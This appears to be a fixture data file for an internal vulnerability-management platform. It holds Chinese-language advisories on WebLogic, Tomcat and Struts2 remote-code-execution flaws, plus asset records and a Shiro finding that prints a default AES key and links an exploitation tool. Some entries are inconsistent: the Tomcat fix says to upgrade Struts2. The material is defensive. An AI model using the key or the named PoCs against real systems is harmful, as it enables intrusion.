  'md_raw_content': '| **漏洞类型** | **影响组件** | **危害程度**       |\r\n| ------------ | ------------ | ------------------ |\r\n| 远程命令执行 | Weblogic     | 高危               |\r\n| **CVE**      | **发现时间** | **对应poc**        |\r\n| 见检查项目   | 无           | weblogic_t3_rce.py |\r\n\r\n## 漏洞描述\r\n\r\n#### 影响版本\r\n\r\n&emsp;&emsp;&emsp;&emsp;最新漏洞影响版本\r\n\r\n&emsp;&emsp;&emsp;&emsp;Oracle WebLogic Server10.3.6.0\r\n\r\n&emsp;&emsp;&emsp;&emsp;Oracle WebLogic Server12.2.1.3\r\n\r\n&emsp;&emsp;&emsp;&emsp;Oracle WebLogic Server12.1.3.0\r\n\r\n#### 检查项目\r\n\r\n&emsp;&emsp;&emsp;&emsp;检查T3服务是否开放，开放可能存在以下漏洞\r\n\r\n&emsp;&emsp;&emsp;&emsp;1. CVE-2015-4852 \r\n&emsp;&emsp;&emsp;&emsp;2. CVE-2016-0638 \r\n&emsp;&emsp;&emsp;&emsp;3. CVE-2016-3510 \r\n&emsp;&emsp;&emsp;&emsp;4. CVE-2017-3248 \r\n&emsp;&emsp;&emsp;&emsp;5. CVE-2018-2628 \r\n&emsp;&emsp;&emsp;&emsp;6. CVE-2018-2893\r\n&emsp;&emsp;&emsp;&emsp;7. CVE-2018-3191\r\n&emsp;&emsp;&emsp;&emsp;8. CVE-2018-3245\r\n\r\n#### 相关链接\r\n\r\n&emsp;&emsp;&emsp;&emsp;https://www.freebuf.com/vuls/179579.html\r\n\r\n&emsp;&emsp;&emsp;&emsp;https://xz.aliyun.com/t/2479\r\n\r\n&emsp;&emsp;&emsp;&emsp;https://paper.seebug.org/728/\r\n\r\n&emsp;&emsp;&emsp;&emsp;https://paper.seebug.org/333/\r\n\r\n&emsp;&emsp;&emsp;&emsp;https://www.oracle.com/technetwork/security-advisory/cpuoct2018-4428296.html\r\n\r\n## 漏洞详情\r\n\r\n&emsp;&emsp;&emsp;&emsp;WebLogic是美国Oracle公司出品的一个Application Server，确切的说是一个基于JAVA EE架构的中间件, WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。\r\n\r\n&emsp;&emsp;&emsp;&emsp;以上漏洞产生于WebLogic T3服务，所有开放WebLogic控制台端口的应用，均会默认开启T3服务。\r\n\r\n&emsp;&emsp;&emsp;&emsp;攻击者通过JRMP协议利用RMI机制的缺陷，进行远程代码执行漏洞的利用。攻击者可以在未授权的情况下，将payload封装，并通过WebLogic的T3协议进行传输，通过对T3协议中的payload进行反序列化，实现对存在漏洞的WebLogic组件进行远程攻击。实现任意代码执行，并获取目标系统的所有权限。\r\n\r\n## 修复建议\r\n\r\n&emsp;&emsp;&emsp;&emsp;升级WebLogic至最新版本',
  'content': '<p>| <strong>漏洞类型<\\/strong> | <strong>影响组件<\\/strong> | <strong>危害程度<\\/strong>       |\n| ------------ | ------------ | ------------------ |\n| 远程命令执行 | Weblogic     | 高危               |\n| <strong>CVE<\\/strong>      | <strong>发现时间<\\/strong> | <strong>对应poc<\\/strong>        |\n| 见检查项目   | 无           | <a href="http://weblogic_t3_rce.py" rel="nofollow">weblogic_t3_rce.py<\\/a> |<\\/p>\n<h2>漏洞描述<\\/h2>\n影响版本\n<p>\u2003\u2003\u2003\u2003最新漏洞影响版本<\\/p>\n<p>\u2003\u2003\u2003\u2003Oracle WebLogic Server10.3.6.0<\\/p>\n<p>\u2003\u2003\u2003\u2003Oracle WebLogic Server12.2.1.3<\\/p>\n<p>\u2003\u2003\u2003\u2003Oracle WebLogic Server12.1.3.0<\\/p>\n检查项目\n<p>\u2003\u2003\u2003\u2003检查T3服务是否开放，开放可能存在以下漏洞<\\/p>\n<p>\u2003\u2003\u2003\u20031. CVE-2015-4852 \n\u2003\u2003\u2003\u20032. CVE-2016-0638 \n\u2003\u2003\u2003\u20033. CVE-2016-3510 \n\u2003\u2003\u2003\u20034. CVE-2017-3248 \n\u2003\u2003\u2003\u20035. CVE-2018-2628 \n\u2003\u2003\u2003\u20036. CVE-2018-2893\n\u2003\u2003\u2003\u20037. CVE-2018-3191\n\u2003\u2003\u2003\u20038. CVE-2018-3245<\\/p>\n相关链接\n<p>\u2003\u2003\u2003\u2003<a href="https://www.freebuf.com/vuls/179579.html" rel="nofollow">https://www.freebuf.com/vuls/179579.html<\\/a><\\/p>\n<p>\u2003\u2003\u2003\u2003<a href="https://xz.aliyun.com/t/2479" rel="nofollow">https://xz.aliyun.com/t/2479<\\/a><\\/p>\n<p>\u2003\u2003\u2003\u2003<a href="https://paper.seebug.org/728/" rel="nofollow">https://paper.seebug.org/728/<\\/a><\\/p>\n<p>\u2003\u2003\u2003\u2003<a href="https://paper.seebug.org/333/" rel="nofollow">https://paper.seebug.org/333/<\\/a><\\/p>\n<p>\u2003\u2003\u2003\u2003<a href="https://www.oracle.com/technetwork/security-advisory/cpuoct2018-4428296.html" rel="nofollow">https://www.oracle.com/technetwork/security-advisory/cpuoct2018-4428296.html<\\/a><\\/p>\n<h2>漏洞详情<\\/h2>\n<p>\u2003\u2003\u2003\u2003WebLogic是美国Oracle公司出品的一个Application Server，确切的说是一个基于JAVA EE架构的中间件, WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。<\\/p>\n<p>\u2003\u2003\u2003\u2003以上漏洞产生于WebLogic T3服务，所有开放WebLogic控制台端口的应用，均会默认开启T3服务。<\\/p>\n<p>\u2003\u2003\u2003\u2003攻击者通过JRMP协议利用RMI机制的缺陷，进行远程代码执行漏洞的利用。攻击者可以在未授权的情况下，将payload封装，并通过WebLogic的T3协议进行传输，通过对T3协议中的payload进行反序列化，实现对存在漏洞的WebLogic组件进行远程攻击。实现任意代码执行，并获取目标系统的所有权限。<\\/p>\n<h2>修复建议<\\/h2>\n<p>\u2003\u2003\u2003\u2003升级WebLogic至最新版本<\\/p>',
  'category_name': '漏洞解决方案'},
 {'_id': '5de76148152e93ac81d80006',
  'title': 'Tomcat远程代码执行漏洞',
  'alias': 'Tomcat远程代码执行漏洞',
  'category': 10,
  'author': 'qitao4@example.cn',
  'publish_time': 1543226724.0,
  'modify_time': 1543226724.0,
  'status': 1,
  'cover': '',
  'summary': '',
  'content_type': 1,
  'raw_content': '',
  'md_raw_content': '| **漏洞类型**   | **影响组件** | **危害程度**       |\r\n| -------------- | ------------ | ------------------ |\r\n| 远程命令执行   | Tomcat       | 高危               |\r\n| **CVE**        | **发现时间** | **对应poc**        |\r\n| CVE-2017-12615 | 2017/09/19   | tomcat_put_file.py |\r\n\r\n## 漏洞描述\r\n\r\n#### 影响版本\r\n\r\n&emsp;&emsp;&emsp;&emsp;Apache Tomcat 7.0.0 - 7.0.79 (windows环境)\r\n\r\n#### 检查项目\r\n\r\n&emsp;&emsp;&emsp;&emsp;Tomcat远程代码执行漏洞\r\n\r\n#### 相关链接\r\n\r\n&emsp;&emsp;&emsp;&emsp;https://mp.weixin.qq.com/s/wWkb079hUYOwDgVQqEqGZQ\r\n\r\n&emsp;&emsp;&emsp;&emsp;http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-12615\r\n\r\n## 漏洞详情\r\n\r\n&emsp;&emsp;&emsp;&emsp;2017年9月19日，Apache Tomcat官方确认并修复了Tomcat远程代码执行漏洞，在一定条件下，攻击者可以利用该漏洞通过精心构造的攻击请求，向用户服务器上传恶意JSP文件，通过上传的 JSP 文件 ，可在用户服务器上执行任意代码，从而导致数据泄露或获取服务器权限，存在高安全风险。\r\n\r\n&emsp;&emsp;&emsp;&emsp;当 Tomcat运行在Windows操作系统时，且启用了HTTP PUT请求方法（例如，将 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求数据包向服务器上传包含任意代码的 JSP 文件，JSP文件中的恶意代码将能被服务器执行。导致服务器上的数据泄露或获取服务器权限。\r\n\r\n## 修复建议\r\n\r\n&emsp;&emsp;&emsp;&emsp;升级struts2至最新版本',
  'content': '<p>| <strong>漏洞类型<\\/strong>   | <strong>影响组件<\\/strong> | <strong>危害程度<\\/strong>       |\n| -------------- | ------------ | ------------------ |\n| 远程命令执行   | Tomcat       | 高危               |\n| <strong>CVE<\\/strong>        | <strong>发现时间<\\/strong> | <strong>对应poc<\\/strong>        |\n| CVE-2017-12615 | 2017/09/19   | <a href="http://tomcat_put_file.py" rel="nofollow">tomcat_put_file.py<\\/a> |<\\/p>\n<h2>漏洞描述<\\/h2>\n影响版本\n<p>\u2003\u2003\u2003\u2003Apache Tomcat 7.0.0 - 7.0.79 (windows环境)<\\/p>\n检查项目\n<p>\u2003\u2003\u2003\u2003Tomcat远程代码执行漏洞<\\/p>\n相关链接\n<p>\u2003\u2003\u2003\u2003<a href="https://mp.weixin.qq.com/s/wWkb079hUYOwDgVQqEqGZQ" rel="nofollow">https://mp.weixin.qq.com/s/wWkb079hUYOwDgVQqEqGZQ<\\/a><\\/p>\n<p>\u2003\u2003\u2003\u2003<a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-12615" rel="nofollow">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-12615<\\/a><\\/p>\n<h2>漏洞详情<\\/h2>\n<p>\u2003\u2003\u2003\u20032017年9月19日，Apache Tomcat官方确认并修复了Tomcat远程代码执行漏洞，在一定条件下，攻击者可以利用该漏洞通过精心构造的攻击请求，向用户服务器上传恶意JSP文件，通过上传的 JSP 文件 ，可在用户服务器上执行任意代码，从而导致数据泄露或获取服务器权限，存在高安全风险。<\\/p>\n<p>\u2003\u2003\u2003\u2003当 Tomcat运行在Windows操作系统时，且启用了HTTP PUT请求方法（例如，将 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求数据包向服务器上传包含任意代码的 JSP 文件，JSP文件中的恶意代码将能被服务器执行。导致服务器上的数据泄露或获取服务器权限。<\\/p>\n<h2>修复建议<\\/h2>\n<p>\u2003\u2003\u2003\u2003升级struts2至最新版本<\\/p>',
  'category_name': '漏洞解决方案'},
 {'_id': '5de76148152e93ac81d80004',
  'title': 'Struts2-devMode(S2-037)远程代码执行漏洞',
  'alias': 'Struts2-devMode(S2-037)远程代码执行漏洞',
  'category': 10,
  'author': 'qitao4@example.cn',
  'publish_time': 1543226572.0,
  'modify_time': 1543226572.0,
  'status': 1,
  'cover': '',
  'summary': '',
  'content_type': 1,
  'raw_content': '',
  'md_raw_content': '| **漏洞类型**  | **影响组件** | **危害程度**  |\r\n| ------------- | ------------ | ------------- |\r\n| 远程命令执行  | Struts2      | 高危          |\r\n| **CVE**       | **发现时间** | **对应poc**   |\r\n| CVE-2016-4438 | 2016/05/02   | struts_045.py |\r\n\r\n## 漏洞描述\r\n\r\n#### 影响版本\r\n\r\n&emsp;&emsp;&emsp;&emsp;漏洞影响部署使用REST插件的Struts2.3.20 - 2.3.28.1版本。\r\n\r\n#### 检查项目\r\n\r\n&emsp;&emsp;&emsp;&emsp;Struts2-devMode远程代码执行漏洞\r\n\r\n#### 相关链接\r\n\r\n&emsp;&emsp;&emsp;&emsp;https://cwiki.apache.org/confluence/display/WW/S2-037\r\n\r\n## 漏洞详情\r\n\r\n&emsp;&emsp;&emsp;&emsp;Apache Struts2 在服务器部署使用Rest插件之后，当客户端请求url符合如下格式“actionName/id/methodName”时会获取methodName作为ActionMapping类的method属性，但 method属性未进行严格过滤，导致漏洞产生。从已披露的利用代码看，CNVD认为攻击者利用发起漏洞攻击的原理与S2-032、S2-033漏洞基本一致，都是通过method属性带入到OGNL表达式中，静态调用ognl.OgnlContext的DEFAULT_MEMBER_ACCESS属性并覆盖_memberAccess的方式进行，进而在服务器端执行任意代码。\r\n\r\n## 修复建议\r\n\r\n&emsp;&emsp;&emsp;&emsp;升级struts2至最新版本',
  'content': '<p>| <strong>漏洞类型<\\/strong>  | <strong>影响组件<\\/strong> | <strong>危害程度<\\/strong>  |\n| ------------- | ------------ | ------------- |\n| 远程命令执行  | Struts2      | 高危          |\n| <strong>CVE<\\/strong>       | <strong>发现时间<\\/strong> | <strong>对应poc<\\/strong>   |\n| CVE-2016-4438 | 2016/05/02   | <a href="http://struts_045.py" rel="nofollow">struts_045.py<\\/a> |<\\/p>\n<h2>漏洞描述<\\/h2>\n影响版本\n<p>\u2003\u2003\u2003\u2003漏洞影响部署使用REST插件的Struts2.3.20 - 2.3.28.1版本。<\\/p>\n检查项目\n<p>\u2003\u2003\u2003\u2003Struts2-devMode远程代码执行漏洞<\\/p>\n相关链接\n<p>\u2003\u2003\u2003\u2003<a href="https://cwiki.apache.org/confluence/display/WW/S2-037" rel="nofollow">https://cwiki.apache.org/confluence/display/WW/S2-037<\\/a><\\/p>\n<h2>漏洞详情<\\/h2>\n<p>\u2003\u2003\u2003\u2003Apache Struts2 在服务器部署使用Rest插件之后，当客户端请求url符合如下格式“actionName/id/methodName”时会获取methodName作为ActionMapping类的method属性，但 method属性未进行严格过滤，导致漏洞产生。从已披露的利用代码看，CNVD认为攻击者利用发起漏洞攻击的原理与S2-032、S2-033漏洞基本一致，都是通过method属性带入到OGNL表达式中，静态调用ognl.OgnlContext的DEFAULT_MEMBER_ACCESS属性并覆盖_memberAccess的方式进行，进而在服务器端执行任意代码。<\\/p>\n<h2>修复建议<\\/h2>\n<p>\u2003\u2003\u2003\u2003升级struts2至最新版本<\\/p>',
  'category_name': '漏洞解决方案'},
 {'_id': '5de76148152e93ac81d80002',
  'title': 'Struts2-052远程代码执行漏洞',
  'alias': 'Struts2-052远程代码执行漏洞',
  'category': 10,
  'author': 'qitao4@example.cn',
  'publish_time': 1543226485.0,
  'modify_time': 1543226485.0,
  'status': 1,
  'cover': '',
  'summary': '',
  'content_type': 1,
  'raw_content': '',
  'md_raw_content': '| 漏洞类型      | 影响组件   | 危害程度      |\r\n| ------------- | ---------- | ------------- |\r\n| 远程命令执行  | Struts2    | 高危          |\r\n| CVE           | 发现时间   | 对应poc       |\r\n| CVE-2017-9805 | 2017/06/21 | struts_052.py |\r\n\r\n## 漏洞描述\r\n\r\n#### 影响版本\r\n\r\n&emsp;&emsp;&emsp;&emsp;Struts 2.1.2 - Struts 2.3.33\r\n\r\n&emsp;&emsp;&emsp;&emsp;Struts 2.5 - Struts 2.5.12\r\n\r\n#### 检查项目\r\n\r\n&emsp;&emsp;&emsp;&emsp;Struts2-052远程代码执行漏洞\r\n\r\n#### 相关链接\r\n\r\n&emsp;&emsp;&emsp;&emsp;https://cwiki.apache.org/confluence/display/WW/S2-052\r\n\r\n## 漏洞详细\r\n\r\n&emsp;&emsp;&emsp;&emsp;Apache Struts2的REST插件使用带有XStream例程的XStreamHandler执行反序列化操作，但在反序列化过程中没有执行任何类型过滤，这可能在反序列化XML负载时执行任意代码。任意攻击者都可以构造恶意的XML内容来利用这个漏洞。\r\n\r\n&emsp;&emsp;&emsp;&emsp;关于Xstream：Xstream是一种OXMapping技术，是用来处理XML文件序列化的框架,在将JavaBean序列化或将XML文件反序列化的时候，不需要其它辅助类和映射文件，使得XML序列化不再繁索。Xstream也可以将JavaBean序列化成JSON或反序列化，使用非常方便。\r\n\r\n## 修复建议\r\n\r\n&emsp;&emsp;&emsp;&emsp;升级struts2至最新版本',
  'content': '<p>| 漏洞类型      | 影响组件   | 危害程度      |\n| ------------- | ---------- | ------------- |\n| 远程命令执行  | Struts2    | 高危          |\n| CVE           | 发现时间   | 对应poc       |\n| CVE-2017-9805 | 2017/06/21 | <a href="http://struts_052.py" rel="nofollow">struts_052.py<\\/a> |<\\/p>\n<h2>漏洞描述<\\/h2>\n影响版本\n<p>\u2003\u2003\u2003\u2003Struts 2.1.2 - Struts 2.3.33<\\/p>\n<p>\u2003\u2003\u2003\u2003Struts 2.5 - Struts 2.5.12<\\/p>\n检查项目\n<p>\u2003\u2003\u2003\u2003Struts2-052远程代码执行漏洞<\\/p>\n相关链接\n<p>\u2003\u2003\u2003\u2003<a href="https://cwiki.apache.org/confluence/display/WW/S2-052" rel="nofollow">https://cwiki.apache.org/confluence/display/WW/S2-052<\\/a><\\/p>\n<h2>漏洞详细<\\/h2>\n<p>\u2003\u2003\u2003\u2003Apache Struts2的REST插件使用带有XStream例程的XStreamHandler执行反序列化操作，但在反序列化过程中没有执行任何类型过滤，这可能在反序列化XML负载时执行任意代码。任意攻击者都可以构造恶意的XML内容来利用这个漏洞。<\\/p>\n<p>\u2003\u2003\u2003\u2003关于Xstream：Xstream是一种OXMapping技术，是用来处理XML文件序列化的框架,在将JavaBean序列化或将XML文件反序列化的时候，不需要其它辅助类和映射文件，使得XML序列化不再繁索。Xstream也可以将JavaBean序列化成JSON或反序列化，使用非常方便。<\\/p>\n<h2>修复建议<\\/h2>\n<p>\u2003\u2003\u2003\u2003升级struts2至最新版本<\\/p>',
  'category_name': '漏洞解决方案'}]

ASSET = [{"app_id": 1, "name": "dev.example.com", "value": "dev.example.com", "type": "10", "is_open": 1, "is_https": 1, "apptype": "10", "status": 0, "create_time": 1591841741.15751, "update_time": 1591841741.15751}, {"app_id": 2, "name": "pb.example.cn", "value": "pb.example.cn", "type": "10", "is_open": 1, "is_https": 1, "apptype": "10", "status": 0, "create_time": 1591669511.12107, "update_time": 1591669511.12107}]

APP = [{"_id": "5ef18f7f10e58fa3f8889c43", "appname": "APP服务端管理后台", "apptype": 20, "level": 40, "sec_level": 40, "status": 10, "comment": "", "check_time": 1592889215.90376, "offonline_time": 1592889215.90376, "create_time": 1592889215.90376, "update_time": 1592889215.90376, "sensitive_data_count": 0, "sensitive_data": "", "secure_level": 0, "business_cata": "", "downtime": 0, "is_open": 1, "is_interface": 0, "is_https": 1, "eid": "", "crontab": "", "group_id": 1, "sec_owner": 1}, {"_id": "5ee1988ef59da6a8b48a7cea", "appname": "投资管理系统", "apptype": 20, "level": 20, "sec_level": 20, "status": 10, "comment": "", "check_time": 1591842958.82516, "sensitive_data_count": 30, "sensitive_data": "", "secure_level": 0, "business_cata": "", "downtime": 20, "is_open": 0, "is_interface": 0, "is_https": 0, "eid": "", "crontab": "", "group_id": 1, "sec_owner": 1}]

VULS = [{'_id': '5ef3306e10e58fa3f8889c8f',
  'vul_name': 'shiro反序列化漏洞',
  'vul_type': 20,
  'vul_level': 0,
  'self_rank': '17',
  'vul_desc_type': 0,
  'vul_poc': '> 漏洞链接\n\nhttp://e.test.example.net\t\n\n> 漏洞说明\n\n使用了低版本的 apache shiro\n\n使用了默认key：kPH+bIxk5D2deZiIxcaaaA===\n\n> 漏洞证明\n\n参考利用工具：\n\nhttps://github.com/sv3nbeast/ShiroScan\n\n\n\n> 修复建议：\n\n1.升级shiro到1.5.3及以上版本\n\n2.关闭remremberMe\n\n3.修改默认AES key',
  'vul_poc_html': '<p>> 漏洞链接<\\/p>\n<p>http://e.test.example.net<\\/p>\n<p>> 漏洞说明<\\/p>\n<p>使用了低版本的 apache shiro<\\/p>\n<p>使用了默认key：kPH+bIxk5D2deZiIxcaaaA===<\\/p>\n<p>> 漏洞证明<\\/p>\n<p>参考利用工具：<\\/p>\n<p>https://github.com/sv3nbeast/ShiroScan<\\/p>\n<p>> 修复建议：<\\/p>\n<p>1.升级shiro到1.5.3及以上版本<\\/p>\n<p>2.关闭remremberMe<\\/p>\n<p>3.修改默认AES key<\\/p>',
  'vul_solution': '',
  'vul_solution_html': '',
  'article_id': '',
  'audit_user_id': 0,
  'reply': '',
  'user_id': 1,
  'submit_time': 1592995950.64715,
  'audit_time': 1592995967.37974,
  'notice_time': 0.0,
  'update_time': 1592995950.64707,
  'fix_time': 0.0,
  'vul_status': 40,
  'asset_level': 0,
  'real_rank': 17,
  'score': 0,
  'risk_score': 0,
  'left_risk_score': 0,
  'app_id': '1',
  'vul_source': 10,
  'send_msg': 0,
  'is_retest': 0,
  'layer': 10,
  'delay_days': 0,
  'delay_reason': '',
  'group_id': '1',
  'remaining_time': -2}]
